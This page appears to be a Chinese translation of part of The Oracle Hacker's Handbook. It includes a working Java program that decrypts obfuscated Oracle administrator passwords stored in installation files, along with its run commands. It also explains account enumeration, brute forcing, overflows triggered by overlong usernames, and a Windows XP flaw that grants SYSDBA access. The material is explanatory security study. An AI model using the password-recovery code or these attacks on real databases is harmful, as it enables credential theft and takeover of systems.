<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/cfgtoollogs/cfgfw/CfmLogger_install_date.log</span><br><span class="line">$ORACLE_HOME/cfgtoollogs/cfgfw/oracle.assistants.server_install_date.log</span><br><span class="line"></span><br><span class="line">$ORACLE_HOME/cfgtoollogs/configToolAllCommands</span><br><span class="line">$ORACLE_HOME/inventory/Components21/oracle.assistants.server/10.2.0.1.0/</span><br><span class="line">context.xml</span><br><span class="line">$ORACLE_HOME/inventory/ContentsXML/ConfigXML/oracle.assistants.server.10</span><br><span class="line">_2_0_1_0.CFM.1.inst.xml</span><br><span class="line"></span><br><span class="line">$ORACLE_HOME\cfgtoollogs\oui\installActions_install_date.log (Windows</span><br><span class="line">only)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        其中install_date指定服务器的安装日期和时间。 但是，这些密码被混淆并显示如下：05da3f3b20f9ee5e1e992d7d35d5c0c679，但是从中恢复明文密码是一件很简单的事情。 SYS，SYSTEM，SYSMAN和DBSNMP的密码都可以从这些文件中恢复。 以下Java调用Checksum包中的Checksum SHA函数。 请注意，该功能不执行SHA操作。 混淆密码中的前导05表示使用DES解密的代码。 接下来的16个字符构成密钥，接下来的16个字符构成密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">$ cp DumpPassword.java /tmp/DumpPassword.java</span><br><span class="line">$ cd /tmp</span><br><span class="line">$ /oracle/product/10.1.0/Db_1/jdk/bin/javac -classpath</span><br><span class="line">/tmp:/oracle/product/10.1.0/Db_1/jlib/ /tmp/DumpPassword.java</span><br><span class="line">$ /oracle/product/10.1.0/Db_1/jdk/bin/java -classpath</span><br><span class="line">/tmp:/oracle/product/10.1.0/Db_1/jlib/ DumpPassword</span><br><span class="line">05da3f3b20f9ee5e1e992d7d35d5c0c679</span><br><span class="line">Password is foobar</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import oracle.security.misc.Checksum;</span><br><span class="line"></span><br><span class="line">class DumpPassword</span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">        &#123;</span><br><span class="line">            byte b_in[] = HexToByteArray(args[0]);</span><br><span class="line">            try</span><br><span class="line">              &#123;</span><br><span class="line">                      /* Whilst it says SHA - it&#x27;s not!!! */</span><br><span class="line">                  byte b_out[] = Checksum.SHA(b_in, null);</span><br><span class="line">                  System.out.println</span><br><span class="line">(&quot;Password is &quot;+ ByteToHex(b_out));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch(Exception e)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                  System.out.println(&quot;error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      public static String ByteToHex(byte a[])</span><br><span class="line">        &#123;</span><br><span class="line">            String s=&quot;&quot;;</span><br><span class="line">            for(int i=0; i&lt;a.length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                  s+=(char)a[ i ];</span><br><span class="line">            &#125;</span><br><span class="line">            return s;</span><br><span class="line">      &#125;</span><br><span class="line">      public static byte[] HexToByteArray(String str)</span><br><span class="line">      &#123;</span><br><span class="line">            if(str == null)</span><br><span class="line">                      return new byte[0];</span><br><span class="line">            int len = str.length();</span><br><span class="line">            char hex[] = str.toCharArray();</span><br><span class="line">            byte buf[] = new byte[len / 2];</span><br><span class="line">            for(int pos = 0; pos &lt; len / 2; pos++)</span><br><span class="line">                buf[pos] = (byte)(toData(hex[2 * pos]) &lt;&lt; 4 &amp; 0xf0 |</span><br><span class="line">            toData(hex[2 * pos + 1]) &amp; 0xf);</span><br><span class="line">            return buf;</span><br><span class="line">        &#125;</span><br><span class="line">        private static byte toData(char c)</span><br><span class="line">      &#123;</span><br><span class="line">            if(&#x27;0&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;9&#x27;)</span><br><span class="line">                  return (byte)((byte)c - 48);</span><br><span class="line">            if(&#x27;a&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;f&#x27;)</span><br><span class="line">                  return (byte)(((byte)c - 97) + 10);</span><br><span class="line">            if(&#x27;A&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;F&#x27;)</span><br><span class="line">                  return (byte)(((byte)c - 65) + 10);</span><br><span class="line">            else</span><br><span class="line">                  return -1;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        安装10g应用服务器并浏览文件后，发现以下内容也以相同的方式混淆了密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME\inventory\ContentsXML\configtools.xml</span><br><span class="line">$ORACLE_HOME\cfgtoollogs\configtoolsinstalldate.log</span><br><span class="line">$ORACLE_HOME\sysman\emd\targets.xml</span><br><span class="line">$ORACLE_HOME\config\ias.properties</span><br></pre></td></tr></table></figure>

<h3 id="用户名和密码暴力破解"><a href="#用户名和密码暴力破解" class="headerlink" title="用户名和密码暴力破解"></a>用户名和密码暴力破解</h3><p>​        如前所述，当用户尝试向数据库服务器进行身份验证时，它将发出一个挑战-用来加密密码的会话密钥。仅当帐户实际存在时才会发生，因此可以枚举数据库服务器中的帐户。例如，假设我们要确定是否存在一个名为“ HELPDESK”的帐户。为此，我们可以简单地尝试登录服务器-如果服务器向您提出挑战，则该帐户存在。如果未发出质询，则该帐户不存在。尽管这只是一个信息问题，但它泄漏了足够的信息，从而使攻击者知道该帐户是否存在，从而使对SYS和SYSTEM以外的帐户的暴力登录尝试更加可行。可以通过帐户锁定和确保使用强密码来击败暴力登录尝试-有关如何启用此功能的更多信息，请参见数据库黑客手册中的“保护Oracle”一章。在使用优化的蛮力工具进行的实验室测试中，可以执行c。每秒10次登录尝试。</p>
<p>长用户名缓冲区溢出<br>​        2003年2月，Mark Litchfield发现，所有OS上的所有版本的Oracle（9iR2和更早版本）在身份验证过程中都容易受到缓冲区溢出漏洞的攻击。通过在登录时传递一个过长的用户名，该用户名被复制到一个基于堆栈的缓冲区中，该缓冲区溢出，从而覆盖关键的程序控制信息。利用此漏洞，攻击者可以完全控制数据库服务器。 Oracle提供了针对此问题的补丁程序，但仍然很普遍，在那里找到容易受到此类攻击的未打补丁的系统。我听说过一个有关此漏洞的故事，但它可能是那些城市传奇之一。显然，一位Oracle副总裁对他们的代码可能包含这样的错误并为开发人员所用而感到愤怒，要求知道谁负责。他悄悄地得知自己是：漏洞隐藏得很久了，直到VP在Oracle还是一名初级程序员时才编写代码。此溢出已在警报51中修复。</p>
<p>​        在Mark Litchfield发现用户名缓冲区溢出的同一年，在Oracle XML数据库的身份验证过程中发现了更多的溢出。 XML数据库通过TCP端口2100上的FTP和端口8080上的HTTP提供服务。两者都容易受到过长的用户名缓冲区溢出和过长的密码缓冲区溢出的影响。 XML数据库中的这些问题和其他问题是在Blackhat Security Briefings上进行的有关Linux与Windows漏洞利用技术之间的区别的演讲的基础。可以在<a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.ngssoftware.com/papers/exploitvariation.pdf%E4%B8%8A%E6%89%BE%E5%88%B0%E6%9C%AC%E6%96%87%E7%9A%84%E5%89%AF%E6%9C%AC%E3%80%82%E8%BF%99%E4%BA%9B%E7%BC%BA%E9%99%B7%E7%9A%84%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F%E4%BA%8E2003%E5%B9%B48%E6%9C%8818%E6%97%A5%E5%9C%A8Alert">www.ngssoftware.com/papers/exploitvariation.pdf上找到本文的副本。这些缺陷的补丁程序于2003年8月18日在Alert</a> 58中发布。</p>
<p>Windows XP上有关Oracle的说明<br>        如果将Oracle安装在Windows XP上（例如，开发人员的工具箱），则如果用户是ORA_DBA本地组的成员，则他们可以作为SYSDBA连接到数据库服务器，而无需提供SYS用户的密码。在处理这种登录时，Oracle使用NTLM SSPI AcceptSecurityContext（）函数。如果用户提供了正确的用户名和密码，则此函数返回0并创建一个令牌。这样做的问题是，如果启用了简单文件共享，则所有登录尝试均会成功-该用户将被验证为来宾用户。但是，就Oracle而言，认证原则不是“来宾”，而是远程用户认证时作为用户名提供的任何内容。如果他们提供的用户名是ORA_DBA组中有效用户的名称，则Oracle对用户进行身份验证并授予他们SYSDBA访问权限-真诚地假设远程用户必须具有正确的密码，例如AcceptSecurity。 Context（）“说”它们已成功通过身份验证。攻击者所需要做的就是发现ORA_DBA组成员的名称，并在自己的系统上创建一个具有相同名称的用户。由于密码无关紧要，因此攻击者可以以SYSDBA的身份访问Oracle服务器。</p>

            </div>
        
        <footer class="article-footer">
        </footer>
    </div>
</article>


    
<nav id="article-nav">
    
        <a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/" id="article-nav-newer" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Newer</strong>
            <div class="article-nav-title">
                
                    The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 下篇
                
            </div>
        </a>
    
    
        <a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Older</strong>
            <div class="article-nav-title">CVE-2018-11218_Redis Lua缓冲区溢出漏洞</div>
        </a>
    
</nav>





    
    




<!-- baidu url auto push script -->
<script type="text/javascript">
    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
</script>     
</section>
        </div>
        <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            Tahir &copy; 2022 
            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
            
                <br>
                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
                &nbsp;|&nbsp;
                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
            
        </div>
    </div>
</footer>
        

    
        
<script src="/libs/lightgallery/js/lightgallery.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-pager.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-hash.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-share.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-video.min.js"></script>

    
    
        
<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>

    
    
        <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true,
            TeX: {
                equationNumbers: {
                  autoNumber: 'AMS'
                }
            }
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    



<!-- Custom Scripts -->

<script src="/js/main.js"></script>


    </div>
</body>
</html>